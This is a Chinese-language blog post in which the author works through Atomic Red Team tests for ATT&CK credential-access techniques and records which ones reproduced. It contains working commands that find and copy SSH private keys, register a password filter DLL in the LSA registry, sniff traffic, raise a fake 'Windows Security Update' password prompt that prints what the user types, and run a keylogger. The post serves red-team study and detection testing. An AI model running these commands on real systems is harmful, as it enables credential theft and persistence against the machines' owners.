---
layout: post
title: 跟着ATT&CK学安全之credential-access
excerpt: "跟着ATT&CK学安全之credential-access"
categories: [ATT&CK]
comments: true
---
#### T1145 - Private Keys
私钥和证书可以进行权限验证,加解密进行数字签名.攻击者可用这些进行权限维持或者解密文件.通常密钥和证书的后缀是`.key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. `

私钥一般需要密码和口令来操作,所以红队可以使用工具进行键盘记录或者爆破密码
###### 测试1 Private Keys
在windows中查找`.key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc`后缀的文件名
```
echo "ATOMICREDTEAM" > %windir%\cert.key
dir c:\ /b /s .key | findstr /e .key
```
win10成功复现
###### 测试2 Discover Private SSH Keys
在linux中查找ssh私钥
```
find / -name id_rsa >> #{output_file}
find / -name id_dsa >> #{output_file}
```
成功复现
###### 测试3 Copy Private SSH Keys with CP
```
mkdir #{output_folder}
find / -name id_rsa -exec cp --parents {} #{output_folder} \;
find / -name id_dsa -exec cp --parents {} #{output_folder} \;
```
成功复现
###### 测试4 Copy Private SSH Keys with rsync
```
mkdir #{output_folder}
find / -name id_rsa -exec rsync -R {} #{output_folder} \;
find / -name id_dsa -exec rsync -R {} #{output_folder} \;
```
成功复现
### T1174 - Password Filter DLL
Windows password filters对于本地和域账户来说都是一种密码校验的机制,Filters使用dll作为接口,来进行密码规则的校验.Filter Dll在本地电脑对本地账户或者域控管理者进行校验.

在使用Security Accounts Manager注册新的密码之前, Local Security Authority向registered filter请求验证,当验证通过才能进行密码修改

红队可以注册一个有害的password filters来危害本地电脑或者真个域控
###### 测试1 Install and Register Password Filter DLL
使用powershell来安装注册password filter DLL,同时需要administrative权限和重启
```
$passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
$lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
Restart-Computer -Confirm
```
**项目中缺少文件,没有复现**
### T1040 - Network Sniffing
这个没什么说的,就是抓流量
###### 测试1 Packet Capture Linux
```
tcpdump -c 5 -nnni #{interface}
tshark -c 5 -i #{interface}
```
成功复现
###### 测试2 Packet Capture Windows Command Prompt
```
tcpdump -c 5 -nnni #{interface}
tshark -c 5 -i #{interface}
```
成功复现
### T1141 - Input Prompt
当程序被运行后需要额外的权限的时候,系统会向用户索要额外的权限凭证.红队可模仿这个方法,向用户索要额外的权限凭证.并记录下来
###### 测试1 PowerShell - Prompt User for Password
在powershell中运行
```
# Creates GUI to prompt for password. Expect long pause before prompt is available.    
$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)
# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.
write-warning $cred.GetNetworkCredential().Password
```
ps:效果相当好啊!!!

win10成功复现
### T1056 - Input Capture
Keylogging 是最常用的input caputure手段
###### 测试1 Input Capture
```
set-ExecutionPolicy RemoteSigned
.\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
```
没有成功,回家再试一下
